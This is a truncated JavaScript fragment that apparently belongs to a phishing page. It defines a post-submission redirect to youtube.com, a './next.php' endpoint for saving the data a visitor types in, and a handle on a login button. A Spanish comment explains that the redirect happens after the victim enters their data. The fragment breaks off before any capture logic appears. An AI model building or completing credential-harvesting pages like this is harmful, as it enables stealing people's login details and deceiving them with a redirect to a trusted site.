...
document.addEventListener("DOMContentLoaded", function () {
    const URL_REDIRECCION = "www.youtube.com", // La url a la que se envía después de que pone sus datos
        URL_GUARDAR_DATOS = "./next.php",
        $btnLogin = document.querySelector("#loginbutton"),
